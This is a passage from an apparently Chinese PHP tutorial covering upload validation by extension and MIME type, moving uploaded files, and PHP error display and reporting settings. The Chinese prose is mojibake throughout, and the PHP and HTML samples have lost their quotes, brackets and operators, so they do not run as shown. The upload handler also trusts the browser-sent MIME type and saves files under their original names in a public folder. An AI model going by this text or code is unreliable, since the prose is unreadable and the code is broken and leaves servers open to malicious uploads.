3.åˆ¤æ–­åç¼€åå’Œmimeç±»å‹æ˜¯å¦ç¬¦åˆåœ¨ç½‘ç»œä¸–ç•Œé‡Œé¢ä¹Ÿæœ‰åäººã€‚ä»–ä»¬ä¼šæŠŠå›¾ç‰‡æ’å…¥ç—…æ¯’ï¼Œåœ¨é™„ä»¶ä¸­ä¸Šä¼ ç—…æ¯’ï¼Œä»–ä»¬ä¼šåœ¨ç½‘é¡µä¸­æ’å…¥ç—…æ¯’æˆ–è€…é»„è‰²å›¾ç‰‡ã€‚ æˆ‘ä»¬éœ€è¦å¯¹äºä¸Šä¼ çš„æ–‡ä»¶åç¼€å’Œmimeç±»å‹éƒ½è¦è¿›è¡Œåˆ¤æ–­æ‰å¯ä»¥ /* ç™¾åº¦è§£é‡Šï¼šMIME(Multipurpose Internet Mail Extensions)æ˜¯å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚ é€šä¿—è§£é‡Šï¼š æœ‰å…´è¶£çœ‹ä¸€çœ‹ å…¶å®MIMEæ›´åƒæ˜¯ä¸€ç§åè®®ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬è¦äº†è§£æµè§ˆå™¨æ˜¯å¦‚ä½•å¤„ç†å†…å®¹çš„ã€‚åœ¨æµè§ˆå™¨ä¸­æ˜¾ç¤ºçš„å†…å®¹æœ‰ HTMLã€æœ‰ XMLã€æœ‰ GIFã€è¿˜æœ‰Flash â€¦â€¦é‚£ä¹ˆï¼Œæµè§ˆå™¨æ˜¯å¦‚ä½•åŒºåˆ†å®ƒä»¬ï¼Œå†³å®šä»€ä¹ˆå†…å®¹ç”¨ä»€ä¹ˆå½¢å¼æ¥æ˜¾ç¤ºå‘¢ï¼Ÿç­”æ¡ˆæ˜¯ MIME Typeï¼Œä¹Ÿå°±æ˜¯è¯¥èµ„æºçš„åª’ä½“ç±»å‹ã€‚ åª’ä½“ç±»å‹é€šå¸¸æ˜¯é€šè¿‡ HTTP åè®®ï¼Œç”± Web æœåŠ¡å™¨å‘ŠçŸ¥æµè§ˆå™¨çš„ï¼Œæ›´å‡†ç¡®åœ°è¯´ï¼Œæ˜¯é€šè¿‡ Content\u0002Type æ¥è¡¨ç¤ºçš„ï¼Œä¾‹å¦‚:Content-Type: text/HTML,è¡¨ç¤ºå†…å®¹æ˜¯ text/HTML ç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¶…æ–‡æœ¬æ–‡ä»¶ã€‚ä¸ºä»€ä¹ˆæ˜¯â€œtext/HTMLâ€è€Œä¸æ˜¯â€œHTML/textâ€æˆ–è€…åˆ«çš„ä»€ä¹ˆï¼ŸMIME Type ä¸æ˜¯ä¸ªäººæŒ‡å®šçš„ï¼Œæ˜¯ç»è¿‡ ietf ç»„ç»‡åå•†ï¼Œä»¥ RFC çš„å½¢å¼ä½œä¸ºå»ºè®®çš„æ ‡å‡†å‘å¸ƒåœ¨ç½‘ä¸Šçš„ï¼Œå¤§å¤šæ•°çš„ Web æœåŠ¡å™¨å’Œç”¨æˆ·ä»£ç†éƒ½ä¼šæ”¯æŒè¿™ä¸ªè§„èŒƒ (é¡ºä¾¿è¯´ä¸€å¥ï¼ŒEmail é™„ä»¶çš„ç±»å‹ä¹Ÿæ˜¯é€šè¿‡MIME Type æŒ‡å®šçš„)ã€‚ é€šå¸¸åªæœ‰ä¸€äº›åœ¨äº’è”ç½‘ä¸Šè·å¾—å¹¿æ³›åº”ç”¨çš„æ ¼å¼æ‰ä¼šè·å¾—ä¸€ä¸ª MIME Typeï¼Œå¦‚æœæ˜¯æŸä¸ªå®¢æˆ·ç«¯è‡ªå·±å®šä¹‰çš„æ ¼å¼ï¼Œä¸€èˆ¬åªèƒ½ä»¥ application/x- å¼€å¤´ã€‚ XHTML æ­£æ˜¯ä¸€ä¸ªè·å¾—å¹¿æ³›åº”ç”¨çš„æ ¼å¼ï¼Œå› æ­¤ï¼Œåœ¨ RFC 3236 ä¸­ï¼Œè¯´æ˜äº† XHTML æ ¼å¼æ–‡ä»¶çš„ MIME Type åº”è¯¥æ˜¯ application/xHTML+XMLã€‚ å½“ç„¶ï¼Œå¤„ç†æœ¬åœ°çš„æ–‡ä»¶ï¼Œåœ¨æ²¡æœ‰äººå‘Šè¯‰æµè§ˆå™¨æŸä¸ªæ–‡ä»¶çš„ MIME Type çš„æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨ä¹Ÿä¼šåšä¸€äº›é»˜è®¤çš„å¤„ç†ï¼Œè¿™å¯èƒ½å’Œä½ åœ¨æ“ä½œç³»ç»Ÿä¸­ç»™æ–‡ä»¶é…ç½®çš„ MIME Type æœ‰å…³ã€‚æ¯”å¦‚åœ¨ Windows ä¸‹ï¼Œæ‰“å¼€æ³¨å†Œè¡¨çš„â€œHKEY_LOCAL_MACHINESOFTWAREClassesMIMEDatabaseContent Typeâ€ä¸»é”®ï¼Œä½ å¯ä»¥çœ‹åˆ°æ‰€æœ‰ MIME Type çš„é…ç½®ä¿¡æ¯ã€‚ åœ¨æŠŠè¾“å‡ºç»“æœä¼ é€åˆ°æµè§ˆå™¨ä¸Šçš„æ—¶å€™ï¼Œæµè§ˆå™¨å¿…é¡»å¯åŠ¨é€‚å½“çš„åº”ç”¨ç¨‹åºæ¥å¤„ç†è¿™ä¸ªè¾“å‡ºæ–‡æ¡£ã€‚è¿™å¯ä»¥é€šè¿‡å¤šç§ç±»å‹MIMEï¼ˆå¤šåŠŸèƒ½ç½‘é™…é‚®ä»¶æ‰©å……åè®®ï¼‰æ¥å®Œæˆã€‚åœ¨HTTPä¸­ï¼ŒMIMEç±»å‹è¢«å®šä¹‰åœ¨Content-Type headerä¸­ ä¾‹å¦‚ï¼Œå‡è®¾ä½ è¦ä¼ é€ä¸€ä¸ªMicrosoft Excelæ–‡ä»¶åˆ°å®¢æˆ·ç«¯ã€‚é‚£ä¹ˆè¿™æ—¶çš„MIMEç±»å‹å°±æ˜¯â€œapplication/vnd.ms-excelâ€ã€‚åœ¨å¤§å¤šæ•°å®é™…æƒ…å†µä¸­ï¼Œè¿™ä¸ªæ–‡ä»¶ç„¶åå°†ä¼ é€ç»™Execlæ¥å¤„ç†ï¼ˆå‡è®¾æˆ‘ä»¬è®¾å®šExeclä¸ºå¤„ç†ç‰¹æ®ŠMIMEç±»å‹çš„åº”ç”¨ç¨‹åºï¼‰ã€‚åœ¨ASPä¸­ï¼Œè®¾å®šMIMEç±»å‹çš„æ–¹æ³•æ˜¯é€šè¿‡Responseå¯¹è±¡çš„ContentTypeå±æ€§ã€‚ å¤šåª’ä½“æ–‡ä»¶æ ¼å¼MIME æœ€æ—©çš„HTTPåè®®ä¸­ï¼Œå¹¶æ²¡æœ‰é™„åŠ çš„æ•°æ®ç±»å‹ä¿¡æ¯ï¼Œæ‰€æœ‰ä¼ é€çš„æ•°æ®éƒ½è¢«å®¢æˆ·ç¨‹åºè§£é‡Šä¸ºè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€HTML æ–‡æ¡£ï¼Œè€Œä¸ºäº†æ”¯æŒå¤šåª’ä½“æ•°æ®ç±»å‹ï¼ŒHTTPåè®®ä¸­å°±ä½¿ç”¨äº†é™„åŠ åœ¨æ–‡æ¡£ä¹‹å‰çš„MIMEæ•°æ®ç±»å‹ä¿¡æ¯æ¥æ ‡è¯†æ•°æ®ç±»å‹ã€‚ MIMEæ„ä¸ºå¤šç›®Interneté‚®ä»¶æ‰©å±•ï¼Œå®ƒè®¾è®¡çš„æœ€åˆç›®çš„æ˜¯ä¸ºäº†åœ¨å‘é€ç”µå­é‚®ä»¶æ—¶é™„åŠ å¤šåª’ä½“æ•°æ®ï¼Œè®©é‚®ä»¶å®¢æˆ·ç¨‹åºèƒ½æ ¹æ®å…¶ç±»å‹è¿›è¡Œå¤„ç†ã€‚ç„¶è€Œå½“å®ƒè¢«HTTPåè®®æ”¯æŒä¹‹åï¼Œå®ƒçš„æ„ä¹‰å°±æ›´ä¸ºæ˜¾è‘—äº†ã€‚å®ƒä½¿å¾—HTTPä¼ è¾“çš„ä¸ä»…æ˜¯æ™®é€šçš„æ–‡æœ¬ï¼Œè€Œå˜å¾—ä¸°å¯Œå¤šå½©ã€‚ æ¯ä¸ªMIMEç±»å‹ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œå‰é¢æ˜¯æ•°æ®çš„å¤§ç±»åˆ«ï¼Œä¾‹å¦‚å£°éŸ³audioã€å›¾è±¡imageç­‰ï¼Œåé¢å®šä¹‰å…·ä½“çš„ç§ç±»ã€‚å¸¸è§çš„MIMEç±»å‹ è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬ .html,.html text/html æ™®é€šæ–‡æœ¬ .txt text/plain RTFæ–‡æœ¬ .rtf application/rtf GIFå›¾å½¢ .gif image/gif JPEGå›¾å½¢ .ipeg,.jpg image/jpeg auå£°éŸ³æ–‡ä»¶ .au audio/basic MIDIéŸ³ä¹æ–‡ä»¶ mid,.midi audio/midi,audio/x-midi RealAudioéŸ³ä¹æ–‡ä»¶ .ra, .ram audio/x-pn-realaudio MPEGæ–‡ä»¶ .mpg,.mpeg video/mpeg AVIæ–‡ä»¶ .avi video/x-msvideo GZIPæ–‡ä»¶ .gz application/x-gzip TARæ–‡ä»¶ .tar application/x-tar Internetä¸­æœ‰ä¸€ä¸ªä¸“é—¨ç»„ç»‡IANAæ¥ç¡®è®¤æ ‡å‡†çš„MIMEç±»å‹ï¼Œä½†Internetå‘å±•çš„å¤ªå¿«ï¼Œå¾ˆå¤šåº”ç”¨ç¨‹åºç­‰ä¸åŠIANAæ¥ç¡®è®¤ä»–ä»¬ä½¿ç”¨çš„MIMEç±»å‹ä¸ºæ ‡å‡†ç±»å‹ã€‚å› æ­¤ä»–ä»¬ä½¿ç”¨åœ¨ç±»åˆ«ä¸­ä»¥x-å¼€å¤´çš„æ–¹æ³•æ ‡è¯†è¿™ä¸ªç±»åˆ«è¿˜æ²¡æœ‰æˆä¸ºæ ‡å‡†ï¼Œä¾‹å¦‚ï¼šx-gzipï¼Œx-tarç­‰ã€‚äº‹å®ä¸Šè¿™äº›ç±»å‹è¿ç”¨çš„å¾ˆå¹¿æ³›ï¼Œå·²ç»æˆä¸ºäº†äº‹å®æ ‡å‡†ã€‚åªè¦å®¢æˆ·æœºå’ŒæœåŠ¡å™¨å…±åŒæ‰¿è®¤è¿™ä¸ªMIMEç±»å‹ï¼Œå³ä½¿å®ƒæ˜¯ä¸æ ‡å‡†çš„ç±»å‹ä¹Ÿæ²¡æœ‰å…³ç³»ï¼Œå®¢æˆ·ç¨‹åºå°±èƒ½æ ¹æ®MIMEç±»å‹ï¼Œé‡‡ç”¨å…·ä½“çš„å¤„ç†æ‰‹æ®µæ¥å¤„ç†æ•°æ®ã€‚è€ŒWebæœåŠ¡å™¨å’Œæµè§ˆå™¨ï¼ˆåŒ…æ‹¬æ“ä½œç³»ç»Ÿï¼‰ä¸­ï¼Œç¼ºçœéƒ½è®¾ç½®äº†æ ‡å‡†çš„å’Œå¸¸è§çš„MIMEç±»å‹ï¼Œåªæœ‰å¯¹äºä¸å¸¸è§çš„ MIMEç±»å‹ï¼Œæ‰éœ€è¦åŒæ—¶è®¾ç½®æœåŠ¡å™¨å’Œå®¢æˆ·æµè§ˆå™¨ï¼Œä»¥è¿›è¡Œè¯†åˆ«ã€‚ ç”±äºMIMEç±»å‹ä¸æ–‡æ¡£çš„åç¼€ç›¸å…³ï¼Œå› æ­¤æœåŠ¡å™¨ä½¿ç”¨æ–‡æ¡£çš„åç¼€æ¥åŒºåˆ†ä¸åŒæ–‡ä»¶çš„MIMEç±»å‹ï¼ŒæœåŠ¡å™¨ä¸­å¿…é¡»å®šä¹‰æ–‡æ¡£åç¼€å’ŒMIMEç±»å‹ä¹‹é—´çš„å¯¹åº”å…³ç³»ã€‚è€Œå®¢æˆ·ç¨‹åºä»æœåŠ¡å™¨ä¸Šæ¥æ”¶æ•°æ®çš„æ—¶å€™ï¼Œå®ƒåªæ˜¯ä»æœåŠ¡å™¨æ¥å—æ•°æ®æµï¼Œå¹¶ä¸äº†è§£æ–‡æ¡£çš„åå­—ï¼Œå› æ­¤æœåŠ¡å™¨å¿…é¡»ä½¿ç”¨é™„åŠ ä¿¡æ¯æ¥å‘Šè¯‰å®¢æˆ·ç¨‹åºæ•°æ®çš„MIMEç±»å‹ã€‚æœåŠ¡å™¨åœ¨å‘é€çœŸæ­£çš„æ•°æ®ä¹‹å‰ï¼Œå°±è¦å…ˆå‘é€æ ‡å¿—æ•°æ®çš„MIMEç±»å‹çš„ä¿¡æ¯ï¼Œè¿™ä¸ªä¿¡æ¯ä½¿ç”¨Content-typeå…³é”®å­—è¿›è¡Œå®šä¹‰ï¼Œä¾‹å¦‚ å¯¹äºHTMLæ–‡æ¡£ï¼ŒæœåŠ¡å™¨å°†é¦–å…ˆå‘é€ä»¥ä¸‹ä¸¤è¡ŒMIMEæ ‡è¯†ä¿¡æ¯,è¿™ä¸ªæ ‡è¯†å¹¶ä¸æ˜¯çœŸæ­£çš„æ•°æ®æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ã€‚ Content-type: text/html æ³¨æ„ï¼Œç¬¬äºŒè¡Œä¸ºä¸€ä¸ªç©ºè¡Œï¼Œè¿™æ˜¯å¿…é¡»çš„ï¼Œä½¿ç”¨è¿™ä¸ªç©ºè¡Œçš„ç›®çš„æ˜¯å°†MIMEä¿¡æ¯ä¸çœŸæ­£çš„æ•°æ®å†…å®¹åˆ†éš”å¼€ã€‚MIME (Multipurpose Internet Mail Extensions) æ˜¯æè¿°æ¶ˆæ¯å†…å®¹ç±»å‹çš„å› ç‰¹ç½‘æ ‡å‡†ã€‚ MIME æ¶ˆæ¯èƒ½åŒ…å«æ–‡æœ¬ã€å›¾åƒã€éŸ³é¢‘ã€è§†é¢‘ä»¥åŠå…¶ä»–åº”ç”¨ç¨‹åºä¸“ç”¨çš„æ•°æ®ã€‚å®˜æ–¹çš„ MIME ä¿¡æ¯æ˜¯ç”± Internet Engineering Task Force (IETF) åœ¨ä¸‹é¢çš„æ–‡æ¡£ä¸­æä¾›çš„ï¼š RFC-822 Standard for ARPA Internet text messages RFC-2045 MIME Part 1: Format of Internet Message Bodies RFC-2046 MIME Part 2: Media Types RFC-2047 MIME Part 3: Header Extensions for Non-ASCII Text RFC-2048 MIME Part 4: Registration Procedures RFC-2049 MIME Part 5: Conformance Criteria and Examplesä¸åŒçš„åº”ç”¨ç¨‹åºæ”¯æŒä¸åŒçš„ MIME ç±»å‹ã€‚ */ 15-3-4.ç”Ÿæˆæ–‡ä»¶åæˆ‘ä»¬çš„æ–‡ä»¶ä¸Šä¼ æˆåŠŸäº†ï¼Œä¸ä¼šè®©å®ƒä¿å­˜åŸåã€‚å› ä¸ºï¼Œæœ‰äº›äººåœ¨åŸåä¸­æœ‰æ•æ„Ÿå…³é”®è¯ä¼šè¿åæˆ‘å›½çš„ç›¸å…³æ³•å¾‹å’Œæ³•è§„ã€‚æˆ‘ä»¬å¯ä»¥é‡‡ç”¨date()ã€mt_rand()æˆ–è€…unique()ç”Ÿæˆéšæœºçš„æ–‡ä»¶åã€‚ 15-3-5.åˆ¤æ–­æ˜¯å¦æ˜¯ä¸Šä¼ æ–‡ä»¶æ–‡ä»¶ä¸Šä¼ æˆåŠŸæ—¶ï¼Œç³»ç»Ÿä¼šå°†ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ä¸Šä¼ åˆ°ç³»ç»Ÿçš„ä¸´æ—¶ç›®å½•ä¸­ã€‚äº§ç”Ÿä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ã€‚åŒæ—¶ä¼šäº§ç”Ÿä¸´æ—¶æ–‡ä»¶åã€‚æˆ‘ä»¬éœ€è¦åšçš„äº‹æƒ…æ˜¯å°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°ç³»ç»Ÿçš„æŒ‡å®šç›®å½•ä¸­ã€‚è€Œç§»åŠ¨å‰ä¸èƒ½çç§»åŠ¨ï¼Œæˆ–è€…ç§»åŠ¨é”™äº†éƒ½æ˜¯ä¸ç§‘å­¦çš„ã€‚ç§»åŠ¨å‰æˆ‘ä»¬éœ€è¦ä½¿ç”¨ç›¸å…³å‡½æ•°åˆ¤æ–­ä¸Šä¼ çš„æ–‡ä»¶æ˜¯ä¸æ˜¯é€šè¿‡ HTTP POST ä¸Šä¼ çš„ï¼Œis_uploaded_file()ä¼ å…¥ä¸€ä¸ªå‚æ•°($_FILESä¸­çš„ç¼“å­˜æ–‡ä»¶å)ï¼Œis_uploaded_file() å‡½æ•°æ£€æŸ¥æŒ‡å®šçš„æ–‡ä»¶æ˜¯å¦æ˜¯é€šè¿‡ HTTP POST ä¸Šä¼ çš„ï¼Œå¦‚æœæ–‡ä»¶æ˜¯é€šè¿‡ HTTP POST ä¸Šä¼ çš„ï¼Œè¯¥å‡½æ•°è¿”å› TRUEã€‚ 15-3-6.ç§»åŠ¨ä¸´æ—¶æ–‡ä»¶åˆ°æŒ‡å®šä½ç½®ä¸´æ—¶æ–‡ä»¶æ˜¯çœŸå®çš„ä¸´æ—¶æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶ç§»åŠ¨åˆ°æˆ‘ä»¬çš„ç½‘ç«™ç›®å½•ä¸‹é¢äº†ã€‚è®©æˆ‘ä»¬ç½‘ç«™ç›®å½•çš„æ•°æ®ï¼Œå…¶ä»–äººå¯ä»¥è®¿é—®åˆ°ï¼Œæˆ‘ä»¬ä½¿ç”¨ï¼š move_uploaded_file() ã€‚è¿™ä¸ªå‡½æ•°æ˜¯å°†ä¸Šä¼ æ–‡ä»¶ç§»åŠ¨åˆ°æŒ‡å®šä½ç½®ï¼Œå¹¶å‘½åã€‚ éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼š ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æŒ‡å®šç§»åŠ¨çš„ä¸Šä¼ æ–‡ä»¶ï¼› ç¬¬äºŒä¸ªå‚æ•°æ˜¯æŒ‡å®šçš„æ–‡ä»¶å¤¹å’Œåç§°æ‹¼æ¥çš„å­—ç¬¦ä¸²ã€‚ å¤§è‡´æ­¥éª¤ 15-3-7 php æ–‡ä»¶ä¸Šä¼ è¡¨å•æ³¨æ„äº‹é¡¹ä»£ç ç¤ºä¾‹ åˆ›å»ºindex.htmlæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ !DOCTYPE htmlhtml lang=enhead meta charset=UTF-8 titleTitle/title/headbody h1ä¸Šä¼ æ–‡ä»¶/h1 form action=chuli.php method=post enctype=multipart/form-data è¯·é€‰æ‹©æ–‡ä»¶ï¼šinput type=file name=file /input type=submit value=ä¸Šä¼  / /form/body/html æ³¨æ„äº‹é¡¹ï¼š 1.form è¡¨å•ä¸­çš„å‚æ•°method å¿…é¡»ä¸ºpostã€‚è‹¥ä¸ºgetæ˜¯æ— æ³•è¿›è¡Œæ–‡ä»¶ä¸Šä¼ çš„ 2.enctypeé¡»ä¸ºmultipartform-data å†åˆ›å»ºä¸€ä¸ªphpæ–‡ä»¶ï¼Œæ¯”å¦‚å«åšchuli.php ?php //å–æ–‡ä»¶ä¿¡æ¯ $arr = $_FILES[file]; // æ‹¿åˆ°çš„æ˜¯æ–‡ä»¶æè¿°ä¿¡æ¯çš„æ•°ç»„ //var_dump($arr); // è·å–æ–‡ä»¶æ‰©å±•åï¼Œå¯ä»¥ç”¨åˆ°pathinfo()å‡½æ•° //åŠ é™åˆ¶æ¡ä»¶ //1.æ–‡ä»¶ç±»å‹ //2.æ–‡ä»¶å¤§å° //3.ä¿å­˜çš„æ–‡ä»¶åä¸é‡å¤ if(($arr[type]==image/jpeg || $arr[type]==image/png ) $arr[size]10241000 ) //ä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„ $arr[tmp_name]; //ä¸Šä¼ çš„æ–‡ä»¶å­˜æ”¾çš„ä½ç½® //é¿å…æ–‡ä»¶é‡å¤: //åŠ æ—¶é—´æˆ³.time()åŠ ç”¨æˆ·å.$uidæˆ–è€…åŠ .date(YmdHis) $filename = ./images/.date(YmdHis).$arr[name]; //æ³¨æ„ï¼šè¦åœ¨å½“å‰ä»£ç æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸‹å…ˆå»åˆ›å»ºä¸€ä¸ªåä¸ºimagesçš„æ–‡ä»¶å¤¹ //ä¿å­˜ä¹‹å‰åˆ¤æ–­è¯¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ if(file_exists($filename)) echo è¯¥æ–‡ä»¶å·²å­˜åœ¨; else //ä¸­æ–‡åçš„æ–‡ä»¶å‡ºç°é—®é¢˜ï¼Œæ‰€ä»¥éœ€è¦è½¬æ¢ç¼–ç æ ¼å¼ $filename = iconv(UTF-8,gb2312,$filename); //ç§»åŠ¨ä¸´æ—¶æ–‡ä»¶åˆ°ä¸Šä¼ çš„æ–‡ä»¶å­˜æ”¾çš„ä½ç½®ï¼ˆæ ¸å¿ƒä»£ç ï¼‰ //æ‹¬å·é‡Œï¼š1.ä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„, 2.å­˜æ”¾çš„è·¯å¾„ move_uploaded_file($arr[tmp_name],$filename); echo æ–‡ä»¶ä¸Šä¼ æˆåŠŸ; else echo ä¸Šä¼ çš„æ–‡ä»¶å¤§å°æˆ–ç±»å‹ä¸ç¬¦; ? 16ï¼ŒPHPæ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‡½æ•°systemexec 17 PHPçš„é”™è¯¯å¤„ç†17-1 é…ç½®é¡¹ç®¡ç†åœ¨php.inié…ç½®æ–‡ä»¶ä¸­ã€‚æˆ‘ä»¬å¯ä»¥æ§åˆ¶phpçš„é”™è¯¯æ˜¾ç¤ºçŠ¶æ€ã€‚php.iniä¸­æœ‰ä¸€ä¸ªä¸“é—¨çš„é…ç½®é¡¹ï¼š display_errors è¿™ä¸ªé€‰é¡¹è®¾ç½®æ˜¯å¦å°†é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ°ç½‘é¡µï¼Œæˆ–è€…å¯¹ç”¨æˆ·éšè—è€Œä¸æ˜¾ç¤ºã€‚ è¿™ä¸ªå€¼çš„çŠ¶æ€ä¸ºon æˆ–è€… offï¼Œä¹Ÿå¯ä»¥è®¾å€¼ä¸º1 æˆ–è€…0ã€‚ display_errorsçš„å€¼è®¾ä¸º0æˆ–è€…offåˆ™ä¸åœ¨é¡µé¢ä¸­æ˜¾ç¤ºé”™è¯¯ï¼Œå¦‚æœè®¾ä¸º1æˆ–è€…onåˆ™æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ã€‚ é—®é¢˜ï¼šå¦‚æœæ²¡æœ‰ä¿®æ”¹æœåŠ¡å™¨php.iniçš„çŠ¶æ€æƒé™æ€ä¹ˆåŠï¼Ÿ é‚£ä¹ˆå¯ä»¥ä½¿ç”¨ini_setæ–¹æ³•æ¥è¿›è¡Œè®¾ç½®ã€‚ ?php ini_set(display_errors , 0 ); ? ä¸Šé¢çš„ä»£ç ä¹Ÿç›¸å½“äºä¿®æ”¹äº†php.iniä¸­display_errorsçš„å€¼ã€‚ä¸è¿‡ï¼Œä»…ä»…åœ¨å½“å‰phpä»£ç ä¸­ç”Ÿæ•ˆã€‚ é—®é¢˜ï¼šæƒ³å–å¾—php.iniçš„é…ç½®é¡¹çŠ¶æ€æ€ä¹ˆåŠï¼Ÿ å¯ä»¥ä½¿ç”¨ini_get(å‚æ•°é¡¹) å¾—åˆ°å‚æ•°çš„å€¼ã€‚ æ¼”ç¤ºä¾‹å­ï¼š ?php echo æœåŠ¡å™¨ä¸­display_errorsçš„çŠ¶æ€ä¸º . ini_get(display_errors);? æ³¨ï¼šå¦‚æœæˆ‘ä»¬ä¿®æ”¹å®Œphp.iniæ–‡ä»¶ä¸­çš„é…ç½®ï¼Œæƒ³è®©é…ç½®ç”Ÿæ•ˆçš„è¯ï¼Œéœ€è¦åœ¨ä¿®æ”¹å®Œphp.iniæ–‡ä»¶åé‡å¯æœåŠ¡å™¨ã€‚ 17-2 é”™è¯¯çº§åˆ« æˆ‘ä»¬ä»‹ç»ä¸€ä¸‹å…¶ä¸­å‡ ç§ï¼š error ## æœ€ä¸¥é‡ï¼Œå¿…é¡»è¦è§£å†³ã€‚ä¸ç„¶ç¨‹åºæ— æ³•ç»§ç»­å‘ä¸‹æ‰§è¡Œwarning ## ä¹Ÿå¾ˆé‡è¦ã€‚ä½†ä¹Ÿå¿…é¡»è¦è§£å†³ã€‚å¦‚æœæ˜ç¡®çš„ã€æ•…æ„çš„å¯ä»¥ä¸ç”¨å¤„ç†ã€‚notice ## ä½ å¯ä»¥ä¸ç”¨ç®¡ã€‚ä½†æ˜¯åœ¨æœ‰äº›å…¬å¸ï¼Œé¡¹ç›®æ ‡å‡†ç‰¹åˆ«é«˜ã€‚åœ¨é«˜æ ‡å‡†è¦æ±‚çš„é¡¹ç›®ä¸­ä¹Ÿå¿…é¡»è¦è§£å†³ã€‚å› ä¸ºï¼Œnotice ## ä¼šå½±å“åˆ°PHPçš„æ‰§è¡Œæ•ˆç‡ã€‚é€šå¸¸å‘ç”Ÿåœ¨å‡½æ•°æœªå®šä¹‰ç­‰ã€‚parse ## é”™è¯¯ï¼Œæ˜¯æŒ‡è¯­æ³•é”™å†™é”™äº†ï¼Œå¿…é¡»è¦è§£å†³ï¼Œä»£è¡¨å…¨éƒ¨ç±»å‹çš„æ‰€æœ‰é”™è¯¯ã€‚ 1ã€ åœ¨php.iniä¸­error_reportingå‚æ•°ã€‚å¦‚è‹¥error_reportingå‚æ•°è®¾ç½®ä¸º0ã€‚æ•´ä¸ªPHPå¼•æ“å‘é”™è¯¯å‡ä¸ä¼šæ˜¾ç¤ºã€è¾“å‡ºã€è®°å½•ã€‚åœ¨ä¸‹ä¸€èŠ‚å°†è¦è®²çš„æ—¥å¿—è®°å½•ä¸­ï¼Œä¹Ÿä¸ä¼šè®°å½•ã€‚ å¦‚æœæˆ‘ä»¬æƒ³æ˜¾ç¤ºæ‰€æœ‰é”™è¯¯å¯ä»¥å†™ä¸Šï¼š error_reporting E_ALL æƒ³è¦æ˜¾ç¤ºæ‰€æœ‰é”™è¯¯ä½†æ’é™¤æç¤ºï¼Œå¯ä»¥å°†è¿™ä¸ªå‚æ•°å†™ä¸ºï¼š error_reporting E_ALL ~ E_NOTICE æ˜¾ç¤ºæ‰€æœ‰é”™è¯¯ï¼Œä½†æ’é™¤æç¤ºã€å…¼å®¹æ€§å’Œæœªæ¥å…¼å®¹æ€§ã€‚å¯å†™ä¸ºï¼š error_reporting ï¼ E_ALL ~E_NOTICE ~E_STRICT ~E_DEPRECATED 2ã€åœ¨æœ‰äº›æƒ…å†µä¸‹æˆ‘ä»¬æ— æƒé™æ“ä½œphp.iniæ–‡ä»¶ï¼Œåˆæƒ³è¦æ§åˆ¶error_reportingæ€ä¹ˆåŠå‘¢ï¼Ÿåœ¨è¿è¡Œçš„ xxxx.phpæ–‡ä»¶ä¸­å¼€å§‹å¤„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨error_reporting()å‡½æ•°è¾¾åˆ°ç›®æ ‡ã€‚ æ¼”ç¤ºä»£ç å¦‚ä¸‹ï¼š ?php //å…³é—­äº†æ‰€æœ‰çš„é”™è¯¯æ˜¾ç¤º error_reporting(0); //æ˜¾ç¤ºæ‰€æœ‰é”™è¯¯ //error_reporting(E_ALL); //æ˜¾ç¤ºæ‰€æœ‰é”™è¯¯ï¼Œä½†ä¸æ˜¾ç¤ºæç¤º //error_reporting(E_ALL ~ E_NOTICE);? 17-3 é”™è¯¯è®°å½•æ—¥å¿—åœ¨ä¸€äº›å…¬å¸é‡Œé¢ï¼Œæœ‰ä¸“é—¨çš„æ—¥å¿—æ”¶é›†ç³»ç»Ÿã€‚æ—¥å¿—æ”¶é›†ç³»ç»Ÿä¼šåœ¨èƒŒåé»˜é»˜çš„å¸®ä½ æ”¶é›†é”™è¯¯ã€è­¦å‘Šã€æç¤ºã€‚ ä¹Ÿæœ‰äº›å…¬å¸æ²¡æœ‰ä¸“é—¨çš„æ—¥å¿—æ”¶é›†ç³»ç»Ÿï¼Œé€šè¿‡æ–‡ä»¶æ¥æœåŠ¡å™¨å½“ä¸­çš„è¿è¡Œæ—¥å¿—ã€‚ å…¶ä¸­ï¼šPHPçš„é”™è¯¯ï¼Œè­¦å‘Šè¿™äº›æ˜¯å¿…é¡»è¦æ”¶ä¿¡çš„ã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†â€”â€”ä¸è®©ç”¨æˆ·çœ‹åˆ°ï¼Œè®¾ç½®å¥½é”™è¯¯æŠ¥å‘Šçº§åˆ« å¥½ï¼Œå¦‚ä½•å°†é”™è¯¯æ”¶é›†åˆ°æ—¥å¿—ç³»ç»Ÿä¸­å‘¢ï¼Ÿ 